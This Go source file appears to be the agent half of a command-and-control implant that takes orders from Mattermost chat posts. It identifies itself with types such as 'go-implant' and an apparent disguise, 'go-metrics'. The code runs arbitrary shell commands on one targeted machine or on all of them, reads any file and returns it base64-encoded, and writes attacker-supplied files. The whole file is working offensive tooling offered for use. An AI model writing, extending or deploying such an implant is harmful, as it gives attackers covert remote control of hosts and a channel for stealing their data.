package main

import (
	"log"
	"fmt"
	"strings"
	"os"
	"os/exec"
	b64 "encoding/base64"
	"github.com/mattermost/mattermost/server/public/model"
)

const (
	CommandList = "list"
	CommandExec = "exec"
	CommandRead = "read"
	CommandWrite = "write"
)

const (
	GoMetrics = "go-metrics"
	GoImplant = "go-implant"
)

type Agent struct {
	guid string
	hostname string
	username string
	agent_type string
}

type AgentError struct {
	msg string
}

func (err AgentError) Error() string {
	return err.msg
}

func (agent *Agent) String() string {
	result := fmt.Sprintf("Guid: %s\nHostname: %s\nUsername: %s\nType: %s\n",
				agent.guid,
				agent.hostname,
				agent.username,
				agent.agent_type)

	return result
}

func (agent *Agent) Init(agent_type string) error {
	systemInfo := getSystemInfo()

	agent.guid = systemInfo["guid"]
	agent.hostname = systemInfo["hostname"]
	agent.username = systemInfo["username"]
	agent.agent_type = agent_type

	log.Print("Agent init complete")

	return nil
}

func (agent *Agent) handleCommands(post *model.Post) (result string, err error) {
	message := post.Message
					
	words := strings.Fields(message)
	wordsLen := len(words)
	if  wordsLen < 2 {
		err = AgentError{fmt.Sprintf("Error: Too few arguments %v - %v\n", wordsLen, words)}
		return result, err
	}

	cmdType := words[0]
	cmdTarget := words[1]
	cmdPayload := strings.Join(words[2:], " ")

	agentGuid := agent.guid

	// target can be a GUID or all machines
	if cmdTarget == agentGuid || cmdTarget == "all" {
		log.Print("Executing command ", cmdType)
	} else {
		return result, err
	}

	switch cmdType {
	case CommandList:
		// list <target>
		result, err = agent.AgentList(cmdPayload)
	case CommandExec:
		// exec <target> <cmd>
		if wordsLen < 3 {
			err = AgentError{fmt.Sprintf("Error: Too few arguments %v - %v\n", wordsLen, words)}
			return result, err
		}
		result, err = agent.AgentExec(cmdPayload)
	case CommandRead:
		// read <target> <path>
		if wordsLen < 3 {
			err = AgentError{fmt.Sprintf("Error: Too few arguments %v - %v\n", wordsLen, words)}
			return result, err
		}
		result, err = agent.AgentRead(cmdPayload)
	case CommandWrite:
		// write <target> <path> <base64-content>
		if wordsLen < 4 {
			err = AgentError{fmt.Sprintf("Error: Too few arguments %v - %v\n", wordsLen, words)}
			return result, err
		}
		filename := words[2]
		content := strings.Join(words[3:], " ")
		result, err = agent.AgentWrite(filename, content)
	}


	return result, err
}

func (agent *Agent) AgentList(payload string) (string, error){
	return agent.String(), nil
}

func (agent *Agent) AgentExec(payload string) (string, error){
	cmd := exec.Command("/bin/sh", "-c", payload)

	output, err := cmd.Output()
	if err != nil {
		log.Print("Error executing command:", err)
		return "", nil
	}

	result := string(output)
	
	return result, nil
}

func (agent *Agent) AgentRead(filename string) (string, error){
	content, err := os.ReadFile(filename)
	if err != nil {
		return "", err
	}

	result := b64.StdEncoding.EncodeToString(content)
	
	return result, nil
}

func (agent *Agent) AgentWrite(filename, content string) (string, error){
	decodedContent, err := b64.StdEncoding.DecodeString(content)
	if err != nil {
		return "", err
	}

	err = os.WriteFile(filename, decodedContent, 0644)
	if err != nil {
		return "", err
	}	

	return "Done", nil
}

func (agent *Agent) Register() (error){
	
	return nil
}
